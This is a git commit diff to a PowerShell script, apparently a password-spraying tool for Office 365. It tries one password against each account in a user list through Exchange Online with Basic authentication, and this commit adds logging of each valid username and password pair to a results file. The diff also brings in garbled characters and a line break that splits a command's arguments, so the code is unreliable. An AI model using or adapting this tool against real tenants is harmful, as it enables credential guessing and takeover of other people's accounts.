241da6a45386338b75e582aebb85bbb1cd091b3d
Nick VanGilder <nickvangilder@icloud.com>
2018-12-12 17:05:08 -0600

    Update O365-spray.ps1

--- O365-spray.ps1
+++ O365-spray.ps1
@@ -9,6 +9,8 @@ Param(
     $UserList = ""
 )
 
+$filename = "results_" + (get-date -Format "ddMMyyyyhhmmss") + ".txt"
+
 Import-Module MSOnline
 
 $x=0
@@ -19,10 +21,12 @@ Write-Host "User #$x"
 Write-Host "Trying username $username"
 $O365password = $password | ConvertTo-SecureString -asPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential($username,$O365password)
-$O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential -Authentication Basic -AllowRedirection
-Connect-MsolService –Credential $credential
+$O365Session = New-PSSession â€“ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential 
+-Authentication Basic -AllowRedirection
+Connect-MsolService â€“Credential $credential
 $Domains = Get-Msoldomain
-if ($Domains) { write-host $username
+if ($Domains) { Add-Content -Path "$filename" -Value "$username is using password $Password"
+write-host $username is using password $Password 
 exit
 }
 }
